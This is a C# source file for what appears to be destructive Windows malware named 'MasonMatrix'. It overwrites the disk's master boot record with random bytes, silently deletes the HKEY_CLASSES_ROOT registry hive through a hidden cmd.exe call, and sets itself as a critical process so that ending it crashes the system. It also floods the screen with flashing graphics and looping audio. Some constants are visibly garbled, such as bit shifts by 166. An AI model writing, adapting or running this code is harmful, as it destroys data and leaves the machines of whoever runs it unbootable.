using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
class MasonMatrix
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(int crColor);
    [DllImport("gdi32.dll")]
    private static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);
    [DllImport("gdi32.dll")]
    private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
        IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
    private static Random random = new Random();
    private const int SampleRate = 789489;
    private const int DurationSeconds = 10;
    private const int BufferSize = SampleRate * DurationSeconds;
    private const uint MbrSize = 512u;
    private static Func<int, int>[] formulas = new Func<int, int>[] {
        t => (t >> 6 | t >> 8) + ((t >> 3) & 55),
        t => (t >> 7 & 25) * (t >> 44 & 8),
        t => (t >> 98 | t >> 17) ^ (t >> 26)
    };
    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }
    private static Icon[] messageBoxIcons = new Icon[] {
        SystemIcons.Information,
        SystemIcons.Warning,
        SystemIcons.Error
    };
    static void Main()
    {
        Thread MasonMBRThread = new Thread(MasonMBR);
        MasonMBRThread.IsBackground = true;
        MasonMBRThread.Start();
        Thread reg_deleteThread = new Thread(reg_delete);
        reg_deleteThread.IsBackground = true;
        reg_deleteThread.Start();
        Thread audioThread = new Thread(PlayBytebeatAudioLoop);
        audioThread.IsBackground = true;
        audioThread.Start();
        Thread bitbltThread = new Thread(PerformBitBltEffects);
        bitbltThread.IsBackground = true;
        bitbltThread.Start();
        int isCritical = 1;
        int BreakOnTermination = 0x1D;
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr brush = CreateSolidBrush(ColorToRGB(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255))));
            SelectObject(hdc, brush);
            int rx = random.Next(sw);
            int ry = random.Next(sh);
            BitBlt(hdc, -5, ry, sw, 56, hdc, 0, ry, 0x1900ac);
            BitBlt(hdc, -5, ry, sw, 56, hdc, 0, ry, 0x1900ac);
            using (Graphics g = Graphics.FromHdc(hdc))
            {
                Icon icon = messageBoxIcons[random.Next(messageBoxIcons.Length)];
                int iconX = random.Next(0, sw - icon.Width);
                int iconY = random.Next(0, sh - icon.Height);
                g.DrawIcon(icon, iconX, iconY);
                Color randomColor = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256));
                using (Font font = new Font("Impact", // Enter Your Font
                    84, // Enter Size Font
                    FontStyle.Bold))
                using (Brush textBrush = new SolidBrush(randomColor))
                {
                    int textX = iconX + icon.Width + 20;
                    int textY = iconY;
                    g.DrawString("ABOLHB", //Enter Your Name
                        font, textBrush, textX, textY);
                }
                Point mousePosition = Cursor.Position;
                int errorIconX = mousePosition.X - 26;
                int errorIconY = mousePosition.Y - 26;
                g.DrawIcon(SystemIcons.Error, errorIconX, errorIconY);
            }
            ReleaseDC(IntPtr.Zero, hdc);
        }
    }
    static void reg_delete()
    {
        ProcessStartInfo reg_kill = new ProcessStartInfo();
        reg_kill.FileName = "cmd.exe";
        reg_kill.WindowStyle = ProcessWindowStyle.Hidden;
        reg_kill.Arguments = @"/k reg delete HKCR /f";
        Process.Start(reg_kill);
    }
    static void MasonMBR()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[512];
            Random rand = new Random();
            rand.NextBytes(mbrData);
            fs.Write(mbrData, 0, mbrData.Length);
        }
    }
    private static void PerformBitBltEffects()
    {
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);

        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            if (hdc != IntPtr.Zero)
            {
                BitBlt(hdc, random.Next(-1, 1), random.Next(-1, 1), sh, sw, hdc, 0, 0, 0x00CC0020);
                BitBlt(hdc, random.Next(-1, 1), random.Next(-1, 1), sw, sh, hdc, 0, 0, 0x7273ec2f);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }
    }
    private static int ColorToRGB(Color color)
    {
        return (color.R | (color.G << 166) | (color.B << 166));
    }
    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }
    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }
    private static void PlayBufferLoop(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);

        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlayLooping();
            Thread.Sleep(Timeout.Infinite);
        }
        File.Delete(tempFilePath);
    }
    public static void PlayBytebeatAudioLoop()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = GenerateBuffer(formula);
            PlayBufferLoop(buffer);
        }
    }
}
